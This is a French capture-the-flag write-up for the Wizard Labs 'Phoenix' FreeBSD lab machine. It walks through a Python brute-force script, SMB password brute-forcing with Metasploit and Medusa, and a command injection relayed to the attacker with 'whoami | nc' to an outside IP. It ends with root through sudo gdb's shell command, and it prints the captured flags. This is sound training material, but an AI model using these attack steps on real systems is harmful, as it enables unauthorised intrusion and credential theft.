# Solution du CTF Phoenix de Wizard Labs

Passion
-------

C'est parti pour ce petit CTF de *WizardLabs* baptisé *Phoenix* et basé sur FreeBSD.  

Nmap nous trouve une poignée de ports ouverts :  

```plain
22/tcp   open  ssh         OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.33 ((FreeBSD))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.8.0 (workgroup: WORKGROUP)
2003/tcp open  finger?
```

La version de Samba ne semble pas être impactée par la faille [SambaCry](https://securelist.com/sambacry-is-coming/78674/).  

Sur le serveur Apache on ne trouve rien... absolument rien, c'est la cata :(  

Le port 2003 fait tourner un service custom :  

```plain
$ ncat 10.1.1.12 2003 -v
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Connected to 10.1.1.12:2003.
  ,---.     ,--.          ,--.         ,-----.                             ,--.
 /  O  \  ,-|  |,--,--,--.`--',--,--, '  .--./ ,---. ,--,--,  ,---.  ,---. |  | ,---.
|  .-.  |' .-. ||        |,--.|      \|  |    | .-. ||      \(  .-' | .-. ||  || .-. :
|  | |  |\ `-' ||  |  |  ||  ||  ||  |'  '--'' '-' '|  ||  |.-'  `)' '-' '|  |\   --.
`--' `--' `---' `--`--`--'`--'`--''--' `-----' `---' `--''--'`----'  `---' `--' `----'

Username ?
```

Bien sûr j'ai tenté de brute-forcer ce service pour trouver un identifiant valide :  

```python
import socket
import sys
from time import sleep

wordlist = sys.argv[1]

word = ""
with open(wordlist, errors="ignore") as fd:
    for i, line in enumerate(fd):
        word = line.strip().lower()
        sock = socket.socket()
        sock.settimeout(5)
        try:
            sock.connect(('10.1.1.12', 2003))
            sock.recv(1024) # banner
            sock.recv(1024) # prompt
            sock.send("{}\n".format(word).encode(errors="ignore"))
            buff = sock.recv(1024).decode() # prompt
            sock.close()
            if "Login Failed !" not in buff:
                print("Received '{}' with user '{}'".format(buff, word))
                sleep(1)
        except socket.error:
            print("Socket error with", word)

        except KeyboardInterrupt:
            print("stopped at", word)
            break

        if i % 5000 == 0:
            print("Status:", i)
```

Sans résultats :'(   

En supposant que le code source de ce service est disponible sous la racine web j'ai cherché des fichiers avec des suffixes py, c, pl... nope.  

Elegance
--------

Côté SMB on peut compter sur Metasploit ou enum4linux pour l'énumération. On voit bien un partage *scripts* mais on ne dispose pas d'accès :  

```plain
[+] Attempting to map shares on 10.1.1.12
//10.1.1.12/scripts Mapping: DENIED, Listing: N/A
//10.1.1.12/IPC$    [E] Can't understand response:
```

Il semble aussi qu'il y ait un utilisateur *tom* sur le système :  

```plain
 ====================================================================
|    Users on 10.1.1.12 via RID cycling (RIDS: 500-550,1000-1050)    |
 ====================================================================
[I] Found new SID: S-1-22-2
[I] Found new SID: S-1-5-21-1573118214-49521899-4168781395
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1001 Unix User\tom (Local User)
```

Là encore toutes les tentatives de brute-forcer ce compte en SSH ou SMB n'ont pas abouties :|   

Il fallait finalement se mettre à brute-forcer le compte SMB de root. Mais là où c'était réellement frustrant c'est que Hydra, Ncrack ainsi que le script NSE de Nmap ne sont pas parvenus à voir l'authentification réussie quand elle avait lieu :-/   

En bref pour du brute-force SMB privilégiez Metasploit ou Medusa :  

```plain
msf5 auxiliary(scanner/smb/smb_login) > run

[*] 10.1.1.12:445         - 10.1.1.12:445 - Starting SMB login bruteforce
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:root',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:123456',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:12345',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:123456789',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:password',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:iloveyou',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:princess',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:1234567',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:rockyou',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:12345678',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:abc123',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:nicole',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:daniel',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:babygirl',
[-] 10.1.1.12:445         - 10.1.1.12:445 - Failed: '.\root:monkey',
[+] 10.1.1.12:445         - 10.1.1.12:445 - Success: '.\root:lovely'
[*] 10.1.1.12:445         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

$ medusa -h 10.1.1.12 -u root -P passwords.txt -M smbnt
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [smbnt] Host: 10.1.1.12 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: root (1 of 7 complete)
ACCOUNT CHECK: [smbnt] Host: 10.1.1.12 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: bidule (2 of 7 complete)
ACCOUNT CHECK: [smbnt] Host: 10.1.1.12 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: lovely (3 of 7 complete)
ACCOUNT FOUND: [smbnt] Host: 10.1.1.12 User: root Password: lovely [SUCCESS (ADMIN$ - Share Unavailable)]
```

Etna
----

On peut désormais accéder à ce partage SMB (mais pas au compte SSH petits malins) :  

```plain
$ smbclient -U root -I 10.1.1.12 //phoenix/scripts
WARNING: The "syslog" option is deprecated
mkdir failed on directory /var/run/samba/msg.lock: Permission non accordée
Unable to initialize messaging context
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jun 23 20:25:02 2018
  ..                                  D        0  Sun Sep 16 11:50:19 2018
  test.py                             A        0  Wed Jun 13 19:52:43 2018
  fucking_coffee.py                   A      672  Thu Jun 14 22:09:10 2018
  hackerutils.py                      A      486  Thu Jun 14 22:09:10 2018
  hangover.py                         A     1216  Thu Jun 14 22:09:10 2018
  admin-console.py                    N     2462  Sat Jun 23 20:34:44 2018

        5774684 blocks of size 1024. 3091832 blocks available
```

Le script qui nous intéresse ici est *admin-console* qui correspond au service sur le port 2003.  

Les lignes intéressantes sont les suivantes :  

```python
if  "tom33094" in (data) :
    client.send("Welcome Tom ! ".encode())
    client.send("String ? ".encode())
    stringo = client.recv(1024).decode()
    execute(stringo)
```

La fonction *execute()* appelle *os.system()*. On peut donc faire exécuter des commandes sans obtenir l'output, à moins de relayer via le *netcat* présent sur la machine :  

```plain
Username ? tom33094
Welcome Tom ! String ? whoami | nc 10.254.0.29 9999
```

Cette exécution de commande est suffisante pour ajouter notre clé publique SSH au fichier *authorized\_keys* de *tom*.  

il faut tout de même si prendre à plusieurs fois car le script lit 1024 octets seulement pour obtenir la commande (on fait d'abord le *mkdir* puis plus tard l'écriture).  

```plain
$ ssh tom@10.1.1.12
Last login: Wed Jun 13 19:09:32 2018 from 192.168.0.29
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 04:10:47 UTC 2017

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

Edit /etc/motd to change this login announcement.
Simple tcsh prompt: set prompt = '%# '
$ ls
user.txt
$ cat user.txt
6563c6118764633b9897bd6fea9ccba4
```

Phoenix
-------

On aurait pu trouver facilement notre chemin vers root mais *LinEnum.sh* m'a mâché le travail :  

```plain
[+] We can sudo without supplying a password!
User tom may run the following commands on Phoenix:
    (ALL) NOPASSWD: /usr/bin/gdb
```

On peut s'en remettre à [gtfobins](https://gtfobins.github.io/gtfobins/gdb/) pour avoir des méthodes pour exécuter un programme depuis GDB (évidemment on peut aussi juste lancer un binaire à tracer) mais les méthodes listées n'ont pas l'air de fonctionner sur cette machine.  

RTFM for fun and profit :p  

```plain
(gdb) help
List of classes of commands:

aliases -- Aliases of other commands
breakpoints -- Making program stop at certain points
data -- Examining data
files -- Specifying and examining files
internals -- Maintenance commands
obscure -- Obscure features
running -- Running the program
stack -- Examining the stack
status -- Status inquiries
support -- Support facilities
tracepoints -- Tracing of program execution without stopping the program
user-defined -- User-defined commands

Type "help" followed by a class name for a list of commands in that class.
Type "help" followed by command name for full documentation.
Command name abbreviations are allowed if unambiguous.
(gdb) help support
Support facilities.

List of commands:

apropos -- Search for commands matching a REGEXP
define -- Define a new command name
document -- Document a user-defined command
--- snip ---
shell -- Execute the rest of the line as a shell command
show architecture -- Show the current target architecture
--- snip ---
(gdb) shell whoami
root
(gdb) shell /bin/sh
# cd /root
# ls
.bash_history   .cshrc      .history    .k5login    .login      .profile    .wget-hsts  root.txt
# cat root.txt
6e1356345d29ccfc1aa3eccefb8179a6714c8be2
```

Un CTF simple si on exclue la galère à avoir un outil de brute-force SMB fonctionnel ainsi que le léger guessing à devoir attaquer le compte root dès le début.

*Published November 17 2020 at 14:25*